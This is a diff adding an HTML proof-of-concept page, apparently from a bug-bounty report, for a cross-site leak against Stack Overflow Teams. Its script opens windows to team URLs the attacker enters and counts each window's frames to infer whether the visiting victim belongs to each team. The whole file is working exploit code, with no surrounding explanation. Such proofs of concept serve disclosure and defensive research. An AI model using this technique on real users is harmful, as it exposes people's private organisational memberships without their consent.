@@ -1,0 +1,51 @@
+<html>
+    <head>
+        <title>POC</title>
+    </head>
+    <body>
+        <center>
+            <h5>Teams where victim is a member</h5>
+            <div id="output"></div>
+        </center>
+        <center>
+            <h5>Teams where victim is not a member</h5>
+            <div id="output1"></div>
+        </center>
+        <br>
+        <center>
+            <label for="teams">Add team names sepeated by commas</label>
+            <input type="text" id="teams" placeholder="test,abcd,1234">
+            <br>
+            <input type="button" value="Start" onclick="xsleak()">
+        </center>
+        <script>
+            var targets=[]
+            var data=[]
+            function sleep (time) {
+                return new Promise((resolve) => setTimeout(resolve, time));
+            }
+
+            function xsleak(){
+                var teams=document.getElementById("teams").value.split(",");
+                console.log(teams)
+                for(var i=0;i<teams.length;i++){
+                    var url=`https://stackoverflow.com/c/${teams[i]}/questions`;
+                    targets.push(url);
+                    data[i]=window.open(targets[i],i,"width=700,height=700");
+                }
+            }
+            sleep(7000).then(() => {
+                    for(var j=0;j< data.length;j++){
+                        if(data[j].window.length>0){
+                            var s=document.getElementById("output").innerHTML
+                            document.getElementById("output").innerHTML=s+'<br>'+targets[j];
+                        }
+                        else{
+                            var a=document.getElementById("output1").innerHTML
+                            document.getElementById("output1").innerHTML=a+'<br>'+targets[j];
+                        }
+                    }
+                });
+        </script>
+    </body>
+</html>
